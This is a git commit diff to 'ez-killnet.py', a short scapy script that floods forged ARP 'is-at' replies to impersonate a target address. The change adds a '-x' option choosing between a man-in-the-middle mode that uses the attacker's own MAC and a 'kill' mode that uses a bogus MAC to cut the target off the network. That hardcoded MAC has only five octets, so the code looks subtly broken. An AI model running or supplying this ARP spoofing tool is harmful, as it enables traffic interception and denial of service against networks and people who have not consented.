7ea517db4c6511931666eb66452c3031c165b546
Ezzeldin Tahoun <tahoune@mcmaster.ca>
2017-08-20 04:26:54 -0400

    Update ez-killnet.py

--- ez-killnet.py
+++ ez-killnet.py
@@ -3,8 +3,11 @@ from scapy.all import *
 from sys import argv, exit
 from argparse import ArgumentParser
  
-def arpy(i, t):
-        MAC = get_if_hwaddr(i)
+def arpy(i, t, x):
+        if x == "mitm":
+                MAC = get_if_hwaddr(i)
+        else:
+                MAC = "90:59:62:73:03"
         while 1:
                 sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=t, hwsrc=MAC))
  
@@ -12,6 +15,8 @@ if __name__ == "__main__":
         ez = ArgumentParser()
         ez.add_argument("-i",required=True, help="iface to attack from")
         ez.add_argument("-t",required=True, help="addr to impersonate")
+        ez.add_argument("-x",required=True, help="kill or mitm")
+ 
         ars = vars(ez.parse_args())
  
-        arpy(ars["i"], ars["t"])
+        arpy(ars["i"], ars["t"], ars["x"])
